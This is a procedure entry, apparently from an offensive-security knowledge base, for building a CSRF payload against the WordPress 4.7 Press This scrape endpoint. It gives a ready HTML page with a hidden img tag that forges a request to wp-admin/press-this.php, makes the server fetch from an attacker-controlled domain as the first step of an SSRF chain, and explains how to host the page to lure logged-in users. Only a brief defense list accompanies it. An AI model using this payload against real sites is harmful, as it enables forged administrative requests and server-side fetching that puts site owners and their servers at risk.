---
id: proc-csrf-payload-press-this-001
name: Create-CSRF-Payload-for-Press-This-Scrape
type: procedure
verified: false
submitted: true
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.373Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Drive-by Compromise]]'
sub_techniques: []
tags:
  - csrf
  - wordpress
commands: []
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: medium
detection_risk: low
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---

# Create-CSRF-Payload-for-Press-This-Scrape

## Summary

This procedure crafts a malicious HTML payload exploiting the lack of CSRF protection in WordPress 4.7's Press This feature, forging a request to trigger the scrape function on wp-admin/press-this.php.

## Description

In WordPress 4.7, the Press This scrape endpoint at wp-admin/press-this.php accepts a 'u' parameter for the URL to scrape without CSRF tokens, allowing authenticated users' browsers to be tricked into submitting requests. The attacker hosts a page that automatically sends this request, initiating server-side fetching of attacker-controlled content. This sets up the chain for SSRF by ensuring the server contacts the attacker's domain.

## Requirements

1. Control of an external domain resolvable by the target server
2. Web hosting capability for the malicious page
3. Knowledge of the target WordPress URL

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens on all admin endpoints, including Press This
- Monitor for unusual requests to wp-admin/press-this.php from authenticated sessions
- Use web application firewalls (WAF) to block forged requests lacking referer headers

## Objectives

1. Forge a request to initiate scraping without user interaction beyond page visit
2. Ensure the request targets attacker-controlled content
3. Prepare for redirect-based SSRF in subsequent steps

## Instructions

### Step 1: Design the Payload HTML

**Context**: Create an invisible element that submits the GET request to the Press This endpoint upon page load.

No command; write HTML file:

```html
<!DOCTYPE html>
<html>
<body>
    <img src="https://target.com/wp-admin/press-this.php?u=http://attackers-domain.com&url-scan-submit=Scan" width="0" height="0" style="display:none;">
</body>
</html>
```

> This img tag triggers the GET request silently. Replace target.com and attackers-domain.com accordingly. The 'u' parameter points to your domain, and 'url-scan-submit=Scan' initiates the scrape.

### Step 2: Host the Payload

**Context**: Serve the HTML from your controlled domain to lure victims.

Upload the file to your web server and access via http://attackers-domain.com/malicious.html.

> Expected: Page loads without visible content, but dev tools show the forged request.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[wordpress]]
